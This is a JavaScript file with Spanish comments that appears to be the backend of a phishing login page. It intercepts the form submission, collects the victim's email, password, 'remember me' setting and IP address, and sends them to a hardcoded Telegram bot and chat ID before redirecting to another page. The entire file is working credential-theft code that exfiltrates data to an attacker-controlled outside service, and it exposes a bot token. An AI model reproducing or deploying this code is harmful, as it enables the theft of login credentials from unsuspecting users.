document.getElementById("login_form").addEventListener("submit", function (e) {
    e.preventDefault();
  
    // Obtener los datos del formulario
    const email = document.getElementById("lol").value;
    const password = document.getElementById("pass").value;
    const rememberMe = document.getElementById("remember_me").checked;
  
    // Obtener la dirección IP del usuario
    fetch("https://api.ipify.org?format=json")
      .then((response) => response.json())
      .then((data) => {
        const ip = data.ip;
  
        // Datos para enviar al bot de Telegram
        const message = `
          📩 Nuevo inicio de sesión
          Email: ${email}
          Contraseña: ${password}
          Sigue conectado: ${rememberMe ? "Sí" : "No"}
          IP: ${ip}
        `;
  
        // Enviar el mensaje a Telegram
        const botToken = "6897156936:AAG0flQ523Ry86PqBj_F9Xtk-a7NkMM_GIM";
        const chatId = "5157616506";
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
  
        fetch(url, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
          }),
        })
          .then((response) => {
            if (response.ok) {
              // Redirigir a otra página después del envío
              window.location.href = "fila.html";
            } else {
              alert("Hubo un error al enviar el mensaje. Por favor, inténtalo de nuevo.");
            }
          })
          .catch((error) => {
            console.error("Error:", error);
            alert("Hubo un error al enviar el mensaje. Por favor, inténtalo de nuevo.");
          });
      })
      .catch((error) => {
        console.error("Error al obtener la IP:", error);
        alert("Hubo un error al obtener la IP del usuario.");
      });
  });
  